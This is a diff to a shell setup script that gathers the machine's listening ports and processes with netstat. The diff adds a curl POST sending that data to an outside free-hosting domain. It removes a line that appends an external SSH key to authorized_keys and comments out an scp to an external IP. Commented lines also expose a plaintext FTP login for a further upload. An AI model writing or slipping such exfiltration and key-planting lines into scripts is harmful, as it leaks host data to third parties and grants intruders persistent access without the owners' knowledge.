@@ -3,12 +3,14 @@
 sudo apt-get update 
 sudo apt-get install coreutils -y
 sudo apt install net-tools -y
+sudo apt install curl -y
 #sudo apt install ftp -y
 sudo mkdir -p /debug/
 sudo netstat -tulpn  | sudo tee /debug/netinfo.txt
+data=$(cat /debug/netinfo.txt)
+sudo curl -X POST -d "$data" keysoft.atwebpages.com 
 #sudo ssh-copy-id ubuntu@34.201.164.31
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC85GShmLa7aX4UuT/tsS5THgAnSttI1msxkQ5KrSkHsX+yI5CJlxH70YYe8ccXKSKqpcbaEeTCdIWEOuaAJgJwgwc+lRlM7FJoU+PAOgYZ2LpGHmZ4cXqMmtVkgGrljYxbFKhVzBDg9jXQY1dBv/NtFcLmw7ukCFiJKBzrSwP8AEkORra2HyrWwJGs7zVw0rYNzOleBlxz+I9zBU2bEWxyltFPfB8RfGPwDD43+VcENp3fqj749KQqqhI+Sk8CLlRFTb3lbpFktKhgrU/aDnkNuvby1ow87wZfhYuzzhsRLH464/dDZIlecl6Y4vqguZcUJj9h3XneFJ9x19ndEOv4pIT2GqXcTMiHXMJ7TU+Bs+M2SVqU6hc2NfSFvHcHsqLhnKd7GIm1frDdNzEj9tYllGtYP4ypbhF0EgIwRAai2nHqoGqXEmVMvV7WtXmnGwuPWbTVIoOozzkkv1Ze10kfnkIQE8F8z09ix9wTeRE2ri+jjx3VlEPBFkgnML3dZ86HTpdJeksmbrzYCpMoEXsQQcc7odbRlUXFDQ212ko3k+pszMUdln94QGzU4eaoMQ5q62gQ5FO6itqRoQE928NwAO0keJ9vO+xI6lWlyfQIHTYS1s68MihT37XDulDvWgsFH4eCYnOSVjPqguqA0CAj04kAeE++K2fquAHv52NeaQ== ubuntu@440027-web-01" | sudo tee -a  ~/.ssh/authorized_keys
-sudo scp -o StrictHostKeyChecking=no /debug/netinfo.txt ubuntu@34.201.164.31:/home/ubuntu/mytest
+#sudo scp -o StrictHostKeyChecking=no /debug/netinfo.txt ubuntu@34.201.164.31:/home/ubuntu/mytest
 #echo -e "open ftp.drivehq.com\nuser real_logic Stranger_123\nput /debug/netinfo.txt /netinfo.txt\nbye" | sudo tee /debug/ftp_script.txt
 #ftp -n < /debug/ftp_script.txt
 
